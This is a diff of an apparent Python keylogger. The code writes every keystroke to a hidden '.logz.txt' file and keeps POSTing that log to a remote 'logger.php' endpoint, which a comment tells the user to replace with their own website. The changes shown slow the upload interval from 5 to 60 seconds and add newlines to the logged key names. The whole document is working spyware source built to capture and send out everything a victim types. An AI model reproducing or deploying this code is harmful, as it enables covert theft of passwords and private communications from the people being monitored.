@@ -4,89 +4,89 @@ import win32gui, win32con
 
 def upload():
 	while True:
-		url = 'https://example.com/logger.php' # <------- Replace this with your website
+		url = 'http://example.com/logz/logger.php' # <------- Replace this with your website
 		f = open('.logz.txt')
 		logz = f.read()
 		r = requests.post(url, data={'klogz':logz})
 		f.close()
-		time.sleep(5)
+		time.sleep(60)
 
 def save(key):
 	f = open('.logz.txt','a')
 	if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-		f.write('<Ctrl> ')
+		f.write('<Ctrl> \n')
 	elif key == keyboard.Key.esc:
-		f.write('<Esc> ')
+		f.write('<Esc> \n')
 	elif key == keyboard.Key.space:
-		f.write(' ')
+		f.write(' \n')
 	elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
-		f.write('<Shift> ')
+		f.write('<Shift> \n')
 	elif key == keyboard.Key.backspace:
-		f.write('<Backspace> ')
+		f.write('<Backspace> \n')
 	elif key == keyboard.Key.enter:
-		f.write('<Enter> ')
+		f.write('<Enter> \n')
 	elif key == keyboard.Key.tab:
-		f.write('<Tab> ')
+		f.write('<Tab> \n')
 	elif key == keyboard.Key.caps_lock:
-		f.write('<CapsLk> ')
+		f.write('<CapsLk> \n')
 	elif key == keyboard.Key.cmd:
-		f.write('<Cmd/Win> ')
+		f.write('<Cmd/Win> \n')
 	elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
-		f.write('<Alt> ')
+		f.write('<Alt> \n')
 	elif key == keyboard.Key.menu:
-		f.write('<menu> ')
+		f.write('<menu> \n')
 	elif key == keyboard.Key.left:
-		f.write('<Left> ')
+		f.write('<Left> \n')
 	elif key == keyboard.Key.right:
-		f.write('<Right> ')
+		f.write('<Right> \n')
 	elif key == keyboard.Key.down:
-		f.write('<Down> ')
+		f.write('<Down> \n')
 	elif key == keyboard.Key.up:
-		f.write('<Up> ')
+		f.write('<Up> \n')
 	elif key == keyboard.Key.insert:
-		f.write('<Insert> ')
+		f.write('<Insert> \n')
 	elif key == keyboard.Key.delete:
-		f.write('<Del> ')
+		f.write('<Del> \n')
 	elif key == keyboard.Key.home:
-		f.write('<Home> ')
+		f.write('<Home> \n')
 	elif key == keyboard.Key.end:
-		f.write('<End> ')
+		f.write('<End> \n')
 	elif key == keyboard.Key.page_down:
-		f.write('<PageDown> ')
+		f.write('<PageDown> \n')
 	elif key == keyboard.Key.page_up:
-		f.write('<PageUp> ')
+		f.write('<PageUp> \n')
 	elif key == keyboard.Key.print_screen:
-		f.write('<PrintScreen> ')
+		f.write('<PrintScreen> \n')
 	elif key == keyboard.Key.scroll_lock:
-		f.write('<ScrlLk> ')
+		f.write('<ScrlLk> \n')
 	elif key == keyboard.Key.pause:
-		f.write('<Pause> ')
+		f.write('<Pause> \n')
 	elif key == keyboard.Key.num_lock:
-		f.write('<NumLk> ')
+		f.write('<NumLk> \n')
 	elif key == keyboard.Key.f1:
-		f.write('<f1> ')
+		f.write('<f1> \n')
 	elif key == keyboard.Key.f2:
-		f.write('<f2> ')
+		f.write('<f2> \n')
 	elif key == keyboard.Key.f3:
-		f.write('<f3> ')
+		f.write('<f3> \n')
 	elif key == keyboard.Key.f4:
-		f.write('<f4> ')
+		f.write('<f4> \n')
 	elif key == keyboard.Key.f5:
-		f.write('<f5> ')
+		f.write('<f5> \n')
 	elif key == keyboard.Key.f6:
-		f.write('<f6> ')
+		f.write('<f6> \n')
 	elif key == keyboard.Key.f7:
-		f.write('<f7> ')
+		f.write('<f7> \n')
 	elif key == keyboard.Key.f8:
-		f.write('<f8> ')
+		f.write('<f8> \n')
 	elif key == keyboard.Key.f9:
-		f.write('<f9> ')
+		f.write('<f9> \n')
 	elif key == keyboard.Key.f10:
-		f.write('<f10> ')
+		f.write('<f10> \n')
 	elif key == keyboard.Key.f11:
-		f.write('<f11> ')
+		f.write('<f11> \n')
 	elif key == keyboard.Key.f12:
-		f.write('<f12> ')
+		f.write('<f12> \n')
 	else:
 		f.write(str(key).replace("'",""))
 	f.close()
